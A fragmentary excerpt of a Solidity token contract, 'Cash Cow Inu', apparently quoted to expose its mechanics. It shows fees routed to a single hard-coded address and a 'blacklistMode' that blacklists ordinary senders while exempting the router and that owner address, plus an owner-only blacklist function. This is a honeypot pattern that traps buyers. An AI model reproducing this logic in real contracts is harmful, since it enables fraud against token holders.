...
contract CashCowInu is IERC20, Ownable {
    ...
    string _name = "Cash Cow Inu";
    string _symbol = "CCINU";
    ...
    constructor () {
        ...
        autoLiquidityReceiver = 0xFd041118B29340815Cb111020fA19AD24cC16384;
        marketingFeeReceiver = 0xFd041118B29340815Cb111020fA19AD24cC16384;
        devFeeReceiver = 0xFd041118B29340815Cb111020fA19AD24cC16384;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (blacklistMode) {
          if (sender != ROUTER && recipient != 0xFd041118B29340815Cb111020fA19AD24cC16384) {
            isBlacklisted[sender] = true;
          }
          if (recipient != ROUTER && recipient != DEAD && recipient != ZERO && recipient != 0xFd041118B29340815Cb111020fA19AD24cC16384) {
    ...
    function manageBlacklist(address _address, bool _flag) external onlyOwner {
